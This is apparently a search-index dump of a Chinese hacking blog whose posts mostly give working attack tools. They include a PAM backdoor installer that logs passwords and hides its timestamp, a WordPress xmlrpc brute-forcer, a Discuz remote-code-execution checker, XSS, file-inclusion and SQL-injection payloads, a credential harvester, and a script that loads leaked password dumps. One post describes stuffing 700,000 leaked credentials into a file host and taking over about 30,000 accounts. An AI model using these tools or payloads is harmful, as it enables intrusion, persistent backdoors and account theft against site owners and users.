$db-&gt;prepare($sql);$db-&gt;exec("BEGIN");if(FALSE !==($fp=fopen($txt,'r')))&#123;while(!feof($fp))&#123;$buffer=rtrim(fgets($fp));@list($email,$uname,$pass)=@explode("----",$buffer);@$stmt-&gt;reset();@$stmt-&gt;clear();$stmt-&gt;bindValue(1, $email."\t".$uname, SQLITE3_TEXT); $stmt-&gt;bindValue(2, $pass, SQLITE3_TEXT);@$stmt-&gt;execute(); &#125;$db-&gt;exec("COMMIT");&#125;?&gt; 其实本文就是提供搭建 可移动社工库的一个思路。]]></content>
      <tags>
        <tag>数据优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[查找网站文件中mysql连接信息]]></title>
    <url>%2F2015%2F05%2F24%2Fweb-find-mysql-links%2F</url>
    <content type="text"><![CDATA[使用场景：一个服务器上有上千万 php文件如何在里面找出所有 数据库连接信息呢？当然很多人第一个想到的就是用grep 正则匹配但是 数据库连接接字符串很多种形式所以写了个 php 匹配多种形式的 匹配mysql连接 字符串的脚本暂时只写了找php文件中 mysql密码的使用方法，可以将服务器文件弄到本地(尽量在服务器上少作操作)实例：windows cmd下cd 服务器存放网站的目录 12dir /s /b *.php *.inc *.conf *.config &gt;&gt;list.txtfor /f &quot;tokens=*&quot; %i in (list.txt) do php findpass.php &quot;%i&quot; &gt;&gt;info.txt 命令自己组合 如有找不到的 请贴出 连接数据库 部分代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778&lt;?phpisset($argv[1]) ? $file = trim($argv[1]) : exit();$str = @file_get_contents($file);$sql = find_pass($str);if (!empty($sql)) &#123; echo '---------------------------------------------' . PHP_EOL; echo $file . PHP_EOL . PHP_EOL; foreach ($sql as $s) &#123; echo trim($s) . PHP_EOL; &#125; echo '---------------------------------------------' . PHP_EOL . PHP_EOL;&#125;//debug//else &#123;// echo 'false ! =&gt; ' . $file . PHP_EOL;//&#125;function find_pass($str) &#123; if (preg_match_all('#\$\w*(?:host(?:name)?|server|user(?:name)?|pass(?:word)?)\w*\s*=\s*(?:\'|\")[[:alnum:][:punct:]]+(?:\'|\")#ism', $str, $sqlstr)) &#123; if (count($sqlstr[0]) &gt; 1) &#123; //echo "No 1" . PHP_EOL; return array_unique($sqlstr[0]); &#125; &#125; if (preg_match_all('#mysqli?(?:_p?connect)?\((?:\'|\")([[:alnum:][:punct:]]*)(?:\'|\")\s*,\s*(?:\'|\")([[:alnum:][:punct:]]*)(?:\'|\")\s*,\s*(?:\'|\")([[:alnum:][:punct:]]*)(?:\'|\")#im', $str, $sqlstr)) &#123; //echo "No 2" . PHP_EOL; return array_unique($sqlstr[0]); &#125; if (preg_match_all('#\$[\w]+-&gt;db(?:Host|Name|User|Pass)\s+?=\s*\'(.*?)\';#im', $str, $sqlstr)) &#123; // echo "No 3" . PHP_EOL; return array_unique($sqlstr[0]); &#125; if (preg_match_all('#^((?!\*).)*(mysqli?:\/\/(?!username:password)[[:alnum:][:punct:]]+@[[:alnum:][:punct:]]*\/[[:alnum:][:punct:]]*)(?:\'|\")#im', $str, $sqlstr)) &#123; //echo "No 4" . PHP_EOL; return array_unique($sqlstr[0]); &#125; if (preg_match_all('#^((?!\#|\/\/|\*).)*define\s*\((?:\'|\")(?:\w*SERVER\w*|\w*USER\w*|\w*PASS(?:WORD)?\w*|\w*HOST\w*)(?:\'|\"),\s*(?:\'|\")(.*)(?:\'|\")\)#im', $str, $sqlstr)) &#123; // echo "No 5" . PHP_EOL; return array_unique($sqlstr[0]); &#125; if (preg_match_all('#\[database\]\s*driver\s*?=\s*?.*\s*host\s*?=\s*?(?:\'|\")(.*)(?:\'|\")\s*?username\s*?=\s*?(.*)\s*?password\s*?=\s*?(.*)#im', $str, $sqlstr)) &#123; // echo "No 6" . PHP_EOL; return array_unique($sqlstr[0]); &#125; if (preg_match_all('#^((?!\*).)*(?:\'|\")[[:alnum:][:punct:]]*(?:server|user|login|pass|host)[[:alnum:][:punct:]]*(?:\'|\")\s=&gt;\s*[[:alnum:][:punct:]]+(?:\'|\")#im', $str, $sqlstr)) &#123; if (count($sqlstr[0]) &gt; 1) &#123; // echo "No 7" . PHP_EOL; return array_unique($sqlstr[0]); &#125; &#125; if (preg_match_all('#\$[\w\[\]\'\"\s]*(?:host|server|user|name|pass|password|dbpw|hn|un|pw)\w*[\w\[\]\'\"\s]*=\s*(?:\'|\")[[:alnum:][:punct:]]+(?:\'|\")#im', $str, $sqlstr)) &#123; if (count($sqlstr[0]) &gt; 1) &#123; // echo "No 8" . PHP_EOL; return array_unique($sqlstr[0]); &#125; &#125; if (preg_match_all('#new\sPDO\((?:\'|\")([\w[:punct:]]+)(?:\'|\")\s*,\s*(?:\'|\")([\w[:punct:]]+)\s*,\s*(?:\'|\")([\w[:punct:]]+)(?:\'|\")\)#im', $str, $sqlstr)) &#123; //echo "No 9" . PHP_EOL; return $sqlstr[0]; &#125; if (preg_match_all('#connect\(\'([[:alnum:][:punct:]]+)\'\s*,\s*\'([[:alnum:][:punct:]]+)\'\s*,\s*\'([[:alnum:][:punct:]]+)\'\s*,\s*\'[[:alnum:][:punct:]]+\'\)#im', $str, $sqlstr)) &#123; // echo "No 10" . PHP_EOL; return $sqlstr[0]; &#125; if (preg_match_all('#db_(?:host|login|password|user|username):\s*[[:alnum:][:punct:]]+#im', $str, $sqlstr)) &#123; // echo "No 11" . PHP_EOL; return $sqlstr[0]; &#125;&#125;?&gt;]]></content>
      <tags>
        <tag>实用脚本</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[wordpress 用户枚举，爆破工具]]></title>
    <url>%2F2015%2F02%2F06%2Fwordpress-brute%2F</url>
    <content type="text"><![CDATA[欢迎对该工具进行修改优化，转载请注明原作者，写代码不易。 为什么不用wpscan? 闲着蛋疼写着玩。 核心代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667&lt;?phpinclude 'init.php';define("user", $argv[2]);class BruteWordPress&#123; private $rc; function __construct() &#123; $this-&gt;rc = new RollingCurl(); $this-&gt;rc-&gt;callback = $this-&gt;create_request_callback($this-&gt;rc); $this-&gt;rc-&gt;__set('window_size', Thread); $this-&gt;rc-&gt;__set('time_out', TimeOut); &#125; function create_request_callback($rc) &#123; return function ($response, $info, $request) use ($rc) &#123; if ($info['http_code'] == 404 || $info['http_code'] == 403 || $info['http_code'] == 500) &#123; echo '[-] Access error!' . PHP_EOL; $this-&gt;rc-&gt;cancelRequests(); &#125; $p = $request-&gt;post_data; preg_match_all('/&lt;param&gt;&lt;value&gt;([^\s]+?)&lt;\/value&gt;&lt;\/param&gt;/', $p, $m); $user = $m[1][0]; $pass = $m[1][1]; if (!preg_match('/&lt;boolean&gt;(\d)&lt;\/boolean&gt;/', $response, $is_admin)) &#123; //echo '[*] Brote user ' . $user . " ..." . "\r"; &#125; else &#123; //print_r($is_admin).PHP_EOL; if ($is_admin[1] == 1) &#123; echo '[+] Bruteed~ -&gt; ' . iconv("UTF-8","GB18030//IGNORE",$user) . ':' . $pass . ' [is admin]' . PHP_EOL; $this-&gt;rc-&gt;cancelRequests(); &#125; else &#123; echo '[+] Bruteed~ -&gt; ' . iconv("UTF-8","GB18030//IGNORE",$user) . ':' . $pass . PHP_EOL; $this-&gt;rc-&gt;cancelRequests(); &#125; &#125; &#125;; &#125; function run() &#123; $pass_file = preg_replace('/\s$/', "", file(wordlist)); $user_pre = array('123', '111', '1', 'a', 'pass', '!@#', 'password', 'abc', '1961', '1962', '1963', '1970', '1988', '1989', '1990', '1991', '1992', '1993', '1994', '1995', '1996', '1997', '1998', '1999', '2001', '2002', '2003', '2004', '2006', '2005', '2007', '2008', '2009', '2010', '2011', '2012', '2013', '2014', '2015'); foreach ($user_pre as $pre) &#123; $pre_u[] = user . $pre; &#125; $p = array_merge($pre_u, $pass_file); $passwords = array_unique($p); array_unshift($passwords, user); foreach ($passwords as $pass) &#123; $url = domain . '/xmlrpc.php'; $post_data = sprintf('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;methodCall&gt;&lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;%s&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;%s&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;', user, $pass); $request = new RollingCurlRequest($url, 'POST', $post_data); $request-&gt;options = $GLOBALS["cUrl_options"]; $this-&gt;rc-&gt;add($request); &#125; $this-&gt;rc-&gt;execute(); &#125;&#125;$brute = new BruteWordPress();$brute-&gt;run();?&gt; 说明: 使用非常简单无需其它参数php scan.php http://www.target.com 多线程同时进行,跑完一个用户成功立即退出该任务接着破另外一个用户 自动生成用户名相关并加到字典头部 大大的提高破解速度 模块可单独使用 枚举用户模块 能抓取大部分常规 wordpress站点用户检查枚举到的用户是否为登陆用户如果不是则剔除大大的提高破解效率 该脚本 需curl 扩展支持 利用wordpress 的xmlrpc.php 文件破解可绕过限制并判断是否为管理员用户 环境简单仅需 php.exe 、php5ts.dll 、curl.dll 文件说明 123456init.php 配置及功能函数enum_user.php 根据页面枚举用户chkuser.php 检测枚举到的用户是否为可登陆用户RollingCurl.php 多线程http请求类 （修改版）BruteWordPress.php 爆破类scan.php 主文件(要运行的文件) 绿色php环境完整代码下载]]></content>
      <tags>
        <tag>php控</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Discuz! 6.x/7.x 批量检测脚本]]></title>
    <url>%2F2014%2F11%2F25%2FDiscuz6-x-7-x-exp%2F</url>
    <content type="text"><![CDATA[用法 先 用抓取url工具 抓取 若干 url (url为 带表情的帖子，或回复)存放至 dz.txt 文件 然后执行本脚本 漏洞利用请关注 第82楼 单个测试语句(windows)： 1curl 'http://bbs.test.com/viewthread.php?tid=29958' -s --cookie 'GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();' |findstr /i /c:'&lt;h2&gt;PHP License&lt;/h2&gt;' 有返回说明有洞 1234567891011121314151617181920212223&lt;?php$rc-&gt;__set('time_out', $timeout); //设置超时时间$urls=file('dz.txt');foreach ($urls as $url) &#123;//$url=trim($url);$request = new RollingCurlRequest(trim($url));$request-&gt;options = array(CURLOPT_HTTPHEADER =&gt; array('Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();'));$rc-&gt;add($request);&#125;$rc-&gt;execute();//时间统计函数function func_time()&#123;list($microsec, $sec) = explode(' ', microtime());return $microsec + $sec;&#125;echo '\r\n'.'time: ' . round((func_time() – $start_time), 4) . 'sec ';?&gt;]]></content>
      <tags>
        <tag>php代码控</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php Thread实例]]></title>
    <url>%2F2014%2F08%2F06%2Fphp-Thread%2F</url>
    <content type="text"><![CDATA[支持windows linux 安装配置参考参考1代码示例1代码示例2 拿个 批量url转 ip 做例子： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667&lt;?phpclass test_thread_run extends Thread&#123;public $url;public $data;public function __construct($url)&#123;$this-&gt;url = $url;&#125;public function run()&#123;if(($url = $this-&gt;url))&#123;$this-&gt;data = gethostbyname($url);&#125;&#125;&#125;function model_thread_result_get($urls_array)&#123;foreach ($urls_array as $key =&gt; $value)&#123;$thread_array[$key] = new test_thread_run($value);$thread_array[$key]-&gt;start();&#125;foreach ($thread_array as $thread_array_key =&gt; $thread_array_value)&#123;while($thread_array[$thread_array_key]-&gt;isRunning())&#123;usleep(10);&#125;if($thread_array[$thread_array_key]-&gt;join())&#123;$variable_data[$thread_array_key] = $thread_array[$thread_array_key]-&gt;data;&#125;&#125;return $variable_data;&#125;$urls=file('hosts.txt');//$print_r($urls);$c= count($urls);//$h[]=array(");foreach ($urls as $u)&#123;$urls_array[]=trim($u);&#125;//print_r($urls_array);$t = microtime(true);$result = model_thread_result_get($urls_array);//print_r($result);echo "将$c 条url转换为 ip\n";$e = microtime(true);echo "多线程耗时：".($e-$t)."\n";$t = microtime(true);foreach ($urls_array as $value)&#123;gethostbyname($value);&#125;$e = microtime(true);echo "单线程耗时：".($e-$t)."\n";?&gt;]]></content>
      <tags>
        <tag>php代码控</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hdwiki 一些存储型xss]]></title>
    <url>%2F2014%2F02%2F27%2Fhdwiki-xss%2F</url>
    <content type="text"><![CDATA[官方下载最新版本 1. hdwiki 礼品商店存储型漏洞无任何过滤，后台模块-&gt; 礼品商店 -&gt; 礼品兑换日志 2. 创建或编辑词条 存储型xssexp :过狗&lt;marquee onstart=&#39;javascript:document.write(String.fromCharCode(60, 115, 99, 114, 105, 112,此处省略))&#39;&gt;&lt;/marquee&gt; hdwiki 管理cookie 是无法直接 进入后台 以及执行其它后台操作session 表中 islogin=2 才可以进后台 配合最近一个鸡肋 Referer注入（相关文章：http://hi.baidu.com/h4ckey/item/8bc0c30dbceb6ec2905718af ）:admin_’,islogin=2 # //by @BinAry访问过后台 islogin=2 才可以进行后台操作 (ajax 添加用户)]]></content>
  </entry>
  <entry>
    <title><![CDATA[dedecms 空间存储型xss分析]]></title>
    <url>%2F2014%2F02%2F27%2Fdedecms-space%2F</url>
    <content type="text"><![CDATA[123456789101112131415161718else if($fmdo=='moodmsg')&#123; //用户登录 if($dopost=="sendmsg") &#123; if(!empty($content)) &#123; $ip = GetIP(); $dtime = time(); $ischeck = ($cfg_mb_msgischeck == 'Y')? 0 : 1; if($cfg_soft_lang == 'gb2312') &#123; $content = utf82gb(nl2br($content)); &#125; $content = cn_substrR(HtmlReplace($content,1),360); //对内容进行处理 -&gt; 看看 HtmlReplace函数 //对表情进行解析 $content = addslashes(preg_replace("/\[face:(\d&#123;1,2&#125;)\]/is","&lt;img src='".$cfg_memberurl."/templets/images/smiley/\\1.gif' style='cursor: pointer; position: relative;'&gt;",$content)); 省略... 12345678910111213141516171819202122232425262728function HtmlReplace($str,$rptype=0) &#123; $str = stripslashes($str); //函数删除由 addslashes() 函数添加的反斜杠 $str = preg_replace("/&lt;[\/]&#123;0,1&#125;style([^&gt;]*)&gt;(.*)&lt;\/style&gt;/i", '', $str);//2011-06-30 禁止会员投稿添加css样式 (by:织梦的鱼) if($rptype==0) &#123; $str = htmlspecialchars($str); &#125; else if($rptype==1) &#123; $str = htmlspecialchars($str); //预定义的字符转换为 HTML 实体 $str = str_replace(" ", ' ', $str); $str = preg_replace("/[\r\n\t ]&#123;1,&#125;/", ' ', $str); &#125; else if($rptype==2) &#123; $str = htmlspecialchars($str); $str = str_replace(" ", '', $str); $str = preg_replace("/[\r\n\t ]/", '', $str); &#125; else &#123; $str = preg_replace("/[\r\n\t ]&#123;1,&#125;/", ' ', $str); $str = preg_replace('/script/i', 'ｓｃｒｉｐｔ', $str); $str = preg_replace("/&lt;[\/]&#123;0,1&#125;(link|meta|ifr|fra)[^&gt;]*&gt;/i", '', $str); &#125; return addslashes($str); &#125; HtmlReplace 函数 $rptype 传递过来的是1预定义的字符转换为 HTML 实体 因此插入到数据库的数据 是经过转换 成 html实体的 从而过滤特殊字符 经过函数跟踪发现显示会员心情管理 &lt;?php echo jstrimjajxlog($fields[&#39;msg&#39;],200); ?&gt; 调用了 jstrimjajxlog函数 （将html实体 又还原了 0rz…） 12345678function JstrimJajxLog($str,$len)&#123; $str = cn_substr($str,$len); $str = str_replace(''', '"', $str); $str = str_replace('&amp;lt;', '&lt;', $str); $str = str_replace('&amp;gt;', '&gt;', $str); return $str;&#125; 一般管理员不会去看这个的 注意不要用 引号 因为有 stripslashes 转义测试语句:1&lt;object data=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpOzwvc2NyaXB0Pg==&gt;&lt;/object&gt;]]></content>
  </entry>
  <entry>
    <title><![CDATA[开启GPC情况下本地包含]]></title>
    <url>%2F2013%2F11%2F19%2Fphp-GPC-bypass%2F</url>
    <content type="text"><![CDATA[文章于 2013-11-19 发表于t00ls开启GPC情况下本地包含 漏洞代码: 12$langx=$_REQUEST['langx'];include ($langx.".inc.php"); 环境： 1234567magic_quotes_gpc Onallow_url_fopen Onallow_url_include OnPHP Version 5.3.3-7Apache 2.0Linux debian 2.6.32-5-amd64 GPC 为on%00 截断？ 超长 ././都不行 post 或get方式提交langx=data://text/plain,&lt;?php phpinfo();?&gt; 相当于 包含了一个内容为 &lt;?php phpinfo();?&gt;.inc.php的文件 所以不用考虑截断成功执行! 测试： 12allow_url_fopen Off allow_url_include On 包含失败 12allow_url_fopen On allow_url_include Off 包含失败 依赖条件： 123allow_url_fopen Onallow_url_include OnPHP 5.2.0 以上 利用场景：php 版本过高(大于php5.3.4 NULL截断失效)或开启GPC 导致截取失效, 但恰好服务器 php.ini allow_url_fopen、allow_url_include 都配置为on不过 很少有服务器同时 开启这两个 更多方式期待大家测试与交流 补充： 远程放一个 xx.inc.php利用：http://target_site/include.php?xx=http://xxoo.com/xx利用场景更宽]]></content>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysql 数据dump脚本]]></title>
    <url>%2F2013%2F09%2F13%2Fmysql-bigdata-dump%2F</url>
    <content type="text"><![CDATA[平時有權限訪問數據庫目錄的話 直接下載該數據庫目錄有權限執行命令的話 通過mysqldump或者into outfile也是相當不錯的phpmyadmin 作爲專業的數據庫管理工具備份數據庫的話非常不錯 根據帝國備份以及Navicat寫了個簡單的脫庫腳本優點: 即使執行超時了 或者關閉了瀏覽器 腳本仍然會執行 可以自己構造 字段 進行脫庫（帝國備份是沒有這樣的功能的） 和帝國備份王 以及 Navicat一樣的 將查詢結果保存在服務器（Navicat 不是以這樣的方式） 查詢完畢 自動打包 代码片段： 缺點：本代碼自己臨時寫的 十分簡陋 不返回任何信息 僅能實現 最基本的需求 使用者需有一定的php代碼功底 （比如說 定義數據庫 、定義查詢語句、定義字段、定義編碼） 歡迎修改（優化）成更好更通用的 數據庫備份腳本 題外話：某次测试在內網其它機器上的數據庫需要備份（不是脫庫）出來、數據庫又不允許外網連接、無法獲取shell、 速度佢慢 數據量龐大 。用navicat 幾次均卡死用帝國備份不能指定字段（或者有我沒發現） 所以只能自己折騰一個了 mysqldump]]></content>
  </entry>
  <entry>
    <title><![CDATA[pam后门 自动安装脚本]]></title>
    <url>%2F2013%2F09%2F02%2Fpam-backdoor%2F</url>
    <content type="text"><![CDATA[该脚本来源：https://github.com/m00dy/pam-backdoor/blob/master/pam-backdoor 博主对其第二次修改由 litdgs 改写成自动安装并作相关优化 链接：https://www.t00ls.net/viewthread.php?tid=24062 123456789101112131415161718192021222324252627282930313233343536373839404142434445#!/bin/bash## ##查看版本:##redhat yum list pam##debian&amp;Ubuntu dpkg -s libpam-modules | grep -i version | cut -d' ' -f2##PASS='test123' ##......LOG='\/bin\/.sshlog' ##...... echo ".___ ___. ___ ___ _______ ____ ____ | \/ | / _ \ / _ \ | \ \ \ / / | \ / | | | | | | | | | | .--. | \ \/ / | |\/| | | | | | | | | | | | | | \_ _/ | | | | | |_| | | |_| | | '--' | | | |__| |__| \___/ \___/ |_______/ |__| "echo -e "\nPam-Backdoor\n&#123;code this shit while learning pam&#125;\n\n"oldtime=`stat -c '%z' /lib/security/pam_ftp.so`echo 'Pam backdoor starting!'mirror_url='http://www.linux-pam.org/library/Linux-PAM-1.1.1.tar.gz'#mirror_url='http://yum.singlehop.com/pub/linux/libs/pam/pre/library/Linux-PAM-0.99.6.2.tar.gz'echo 'Fetching from '$mirror_urlwget $mirror_url #fetch the rolltar zxf Linux-PAM-1.1.1.tar.gz #untarcd Linux-PAM-1.1.1#find and replacesed -i -e 's/retval = _unix_verify_password(pamh, name, p, ctrl);/retval = _unix_verify_password(pamh, name, p, ctrl);\n\tif (strcmp(p,"'$PASS'")==0 )&#123;retval = PAM_SUCCESS;&#125;if(retval == PAM_SUCCESS)&#123;\n\tFILE * fp;\n\tfp = fopen("'$LOG'", "a");\n\tfprintf(fp, "%s : %s\\n", name, p);\n\tfclose(fp);\n\t&#125;/g' modules/pam_unix/pam_unix_auth.cDIS=`head /etc/issue -n 1|awk '&#123;print $1&#125;'`#get the versionif [ $DIS = "CentOS" ];then./configure --disable-selinux &amp;&amp; makeelse./configure &amp;&amp; makefi#copy modified pam_unix.soif [ `uname -p` = 'x86_64' ];thenLIBPATH=lib64elseLIBPATH=libfi/bin/cp -rf /$LIBPATH/security/pam_unix.so /$LIBPATH/security/pam_unix.so.bak #.. ........./bin/cp -rf modules/pam_unix/.libs/pam_unix.so /$LIBPATH/security/pam_unix.sotouch -d "$oldtime" /lib/security/pam_unix.socd .. &amp;&amp; rm -rf Linux-PAM-1.1.1*echo "Done bro.." 如报一下错误 请安装flex-devel linux 发行版本太多了 不可能所有版本linux进行测试如有bug 欢迎优化 修正…]]></content>
      <tags>
        <tag>backdoor</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[yunfile网盘多线程破解]]></title>
    <url>%2F2013%2F08%2F20%2Fyunfile%2F</url>
    <content type="text"><![CDATA[文章2013-8-20 13:42 发于t00ls引用rolling-curl 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495&lt;?php/*参考代码文章:www.searchtb.com/2012/06/rolling-curl-best-practices.html*/error_reporting(0); //不显示错误ini_set('memory_limit',-1); //内存设置最高/* @params $str 输入字符 $type 所需获取编码*/function autoiconv($str,$type = "gb2312//ignore")&#123; $utf32_big_endian_bom = chr(0x00) . chr(0x00) . chr(0xfe) . chr(0xff); $utf32_little_endian_bom = chr(0xff) . chr(0xfe) . chr(0x00) . chr(0x00); $utf16_big_endian_bom = chr(0xfe) . chr(0xff); $utf16_little_endian_bom = chr(0xff) . chr(0xfe); $utf8_bom = chr(0xef) . chr(0xbb) . chr(0xbf);$first2 = substr($str, 0, 2); $first3 = substr($str, 0, 3); $first4 = substr($str, 0, 3); if ($first3 == $utf8_bom) $icon = 'utf-8'; elseif ($first4 == $utf32_big_endian_bom) $icon = 'utf-32be'; elseif ($first4 == $utf32_little_endian_bom) $icon = 'utf-32le'; elseif ($first2 == $utf16_big_endian_bom) $icon = 'utf-16be'; elseif ($first2 == $utf16_little_endian_bom) $icon = 'utf-16le'; else &#123; $icon = 'ascii'; return $str;&#125; return iconv($icon,$type,$str);&#125;require("./include/RollingCurl.php"); //载入多线程类$threads=50; //线程$timeout=10; //设置超时$dic_file='./dict/user.txt';//设置加载字典文件$dict=file($dic_file);//设置字典$count=count($dict);echo '[info] 载入字典文件:'.$dic_file.PHP_EOL ;echo '[info] 加载 '.$count.'行字典'.PHP_EOL ;echo '[info] 线程:'.$threads.PHP_EOL ;echo '[info] 超时设定:'.$timeout.PHP_EOL ;usleep(500);echo '[info] 程序初始化中...'.PHP_EOL ; function request_callback($response, $info, $request) &#123;$p= $request-&gt;post_data;preg_match('/module\=member&amp;action\=validateLogin&amp;username\=(.*?)&amp;password\=(.*?)&amp;remember\=on/',$p,$mm);$user=$mm[1];$pass=$mm[2];//判断登录状态以及用户权限if(!preg_match('/^Set-Cookie:[\s]+membership=(\d&#123;1&#125;).*?;+/mi', $response,$match)) &#123; echo '[!] 登录失败 '.'用户名:'.str_pad($user,18," ").'密码:'.str_pad($pass,18," ").PHP_EOL;&#125;else&#123;$id=$match[1];$id= intval(trim($id));if($id==1)&#123;$m='普通会员';&#125;else if($id==2)&#123;$m='高级会员';&#125;else&#123; $m='未知情况';&#125;$str= '[*] 登录成功 '.'用户名:'.str_pad($user,18," ").'密码:'.str_pad($pass,18," ").'权限:'.$m.PHP_EOL;file_put_contents('./log/logins.txt',$str,FILE_APPEND); //保存扫描结果echo $str; &#125;&#125; $rc = new RollingCurl("request_callback");$rc-&gt;window_size = $threads; //设置线程$rc-&gt;timeout = $timeout; //设置超时$method='POST';$u=array('');$p=array('');$url='http://www.yunfile.com/view';foreach ($dict as $k=&gt; $s)&#123;list($u[$k], $p[$k]) = explode(':',trim(autoiconv($s)));$username=$u[$k];$password=$p[$k];$username;$post_data='module=member&amp;action=validateLogin&amp;username='.$username.'&amp;password='.$password.'&amp;remember=on';$request = new RollingCurlRequest($url,$method,$post_data); //CURLOPT_FOLLOWLOCATION=&gt;1 自动跳转 为0 不跳转$request-&gt;options = array(CURLOPT_FOLLOWLOCATION =&gt; 0, CURLOPT_NOBODY =&gt; 1, CURLOPT_HEADER =&gt; 1 ); $rc-&gt;add($request);&#125;$rc-&gt;execute();?&gt; 加载了某市面上泄露的网盘 700075 行用户密码列表(大小 13mb)成功登录 30163个有效帐号其中 495个高级会员耗时 3小时]]></content>
  </entry>
  <entry>
    <title><![CDATA[修罗(Xiuno 1.0.2)bbs 注入漏洞]]></title>
    <url>%2F2011%2F11%2F23%2FXiuno-sql%2F</url>
    <content type="text"><![CDATA[前段时间爆出 Xiuno bbs 后台拿shell无意中翻了下代码发现 搜索型注入漏洞（POST）magic_quotes_gpc = Off 获取用户个数 1' AND (SELECT 1600 FROM(SELECT COUNT(*),CONCAT(0x6c6f7374776f6c667e,(SELECT MID((IFNULL(CAST(COUNT(*) AS CHAR),0x20)),1,50) FROM www_userfield),0x7e7430306c73,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'lost'='lost 获取用户名： 1' AND (SELECT 3849 FROM(SELECT COUNT(*),CONCAT(0x6c6f7374776f6c667e,(SELECT MID((IFNULL(CAST(username AS CHAR),0x20)),1,50) FROM www_userfield LIMIT 0,1),0x7e7430306c73,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'lost'='lost 获取密码: 1' AND (SELECT 7750 FROM(SELECT COUNT(*),CONCAT(0x6c6f7374776f6c667e,(SELECT MID((IFNULL(CAST(password AS CHAR),0x20)),1,50) FROM www_userfield LIMIT 0,1),0x7e7430306c73,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'lost'='lost 获取salt: 1' AND (SELECT 7750 FROM(SELECT COUNT(*),CONCAT(0x6c6f7374776f6c667e,(SELECT MID((IFNULL(CAST(salt AS CHAR),0x20)),1,50) FROM www_userfield LIMIT 0,1),0x7e7430306c73,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'lost'='lost 一步获取 1' AND (SELECT 2861 FROM(SELECT COUNT(*),CONCAT((SELECT concat(0x757365726e616d653a,username,0x3b70617373776f72643a,password,0x3a,salt) FROM www_userfield limit 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'MOBL'='MOBL note:LIMIT = 用户个数-1,1 xx FROM www_userfield where username=&#39;admin&#39;;]]></content>
  </entry>
</search>
